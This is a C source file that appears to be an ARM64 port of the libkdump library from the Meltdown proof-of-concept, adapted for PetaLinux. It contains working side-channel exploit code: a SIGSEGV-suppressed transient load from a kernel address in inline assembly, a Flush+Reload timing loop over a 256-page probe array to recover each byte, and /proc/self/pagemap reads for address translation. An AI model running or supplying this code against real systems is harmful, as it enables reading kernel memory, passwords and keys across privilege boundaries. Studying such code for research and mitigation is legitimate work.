#define _GNU_SOURCE
#include "libkdump.h"
#include <signal.h>
#include <setjmp.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>

static sigjmp_buf buf; // Use sigjmp_buf for better signal state saving
static char *mem = NULL;
static libkdump_config_t config;

static inline uint64_t rdtsc() {
    uint64_t val;
    asm volatile("mrs %0, cntvct_el0" : "=r" (val));
    return val;
}

static inline void flush(void *p) {
    asm volatile("dc civac, %0" : : "r" (p) : "memory");
    asm volatile("dsb sy");
    asm volatile("isb");
}

static inline void maccess(void *p) {
    volatile uint64_t dummy;
    dummy = *(volatile uint64_t *)p;
    asm volatile("dsb sy");
    asm volatile("isb");
}

// Improved handler using siglongjmp
static void segfault_handler(int signum) {
    (void)signum;
    siglongjmp(buf, 1);
}

int libkdump_init(const libkdump_config_t configuration) {
    config = configuration;
    if (config.physical_offset == 0) config.physical_offset = 0xffffffc000000000ULL;
    
    // Allocate 1MB to ensure we have plenty of room for 256 pages
    if (posix_memalign((void**)&mem, 4096, 256 * 4096) != 0) return -1;
    memset(mem, 0xab, 256 * 4096);

    // Use sigaction instead of signal() for PetaLinux stability
    struct sigaction act;
    memset(&act, 0, sizeof(act));
    act.sa_handler = segfault_handler;
    sigemptyset(&act.sa_mask);
    act.sa_flags = SA_NODEFER; // Crucial for ARM64
    sigaction(SIGSEGV, &act, NULL);
    
    return 0;
}

size_t libkdump_virt_to_phys(size_t addr) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) return 0;
    size_t pagesize = sysconf(_SC_PAGESIZE);
    size_t offset = (addr / pagesize) * sizeof(uint64_t);
    uint64_t entry;
    if (lseek(fd, offset, SEEK_SET) == (off_t)-1 || read(fd, &entry, sizeof(uint64_t)) != sizeof(uint64_t)) {
        close(fd); return 0;
    }
    close(fd);
    if (!(entry & (1ULL << 63))) return 0;
    return ((entry & ((1ULL << 55) - 1)) * pagesize) + (addr % pagesize);
}

size_t libkdump_phys_to_virt(size_t addr) {
    return addr + config.physical_offset;
}

int libkdump_read(size_t addr) {
    size_t target_addr = libkdump_phys_to_virt(addr);
    int results[256] = {0};

    for (int m = 0; m < config.measurements; m++) {
        for (int i = 0; i < 256; i++) flush(mem + i * 4096);

        if (sigsetjmp(buf, 1) == 0) {
            // ARM64 Transient Loop with explicit clobbers to prevent Segfaults
            asm volatile (
                "mov x3, #100\n"           // Stall counter
                "1: subs x3, x3, #1\n"     // Create a dependency chain
                "bne 1b\n"                 // Loop a bit to pressure the branch predictor
                "ldrb w1, [%0]\n"          // Prohibited load
                "lsl x1, x1, #12\n"        // Shift to page offset
                "and x1, x1, #0xff000\n"   // Mask it
                "ldr x2, [%1, x1]\n"       // Speculative access to probe array
                :
                : "r"(target_addr), "r"(mem)
                : "x1", "x2", "x3", "w1", "cc"
            );
        }

        for (int i = 0; i < 256; i++) {
            uint64_t t0 = rdtsc();
            maccess(mem + i * 4096);
            if ((rdtsc() - t0) < config.cache_miss_threshold) results[i]++;
        }
    }

    int max_v = 0, max_i = 0;
    for (int i = 1; i < 256; i++) {
        if (results[i] > max_v) { max_v = results[i]; max_i = i; }
    }
    return max_i;
}

void libkdump_cleanup() {
    if (mem) free(mem);
    struct sigaction act;
    memset(&act, 0, sizeof(act));
    act.sa_handler = SIG_DFL;
    sigaction(SIGSEGV, &act, NULL);
}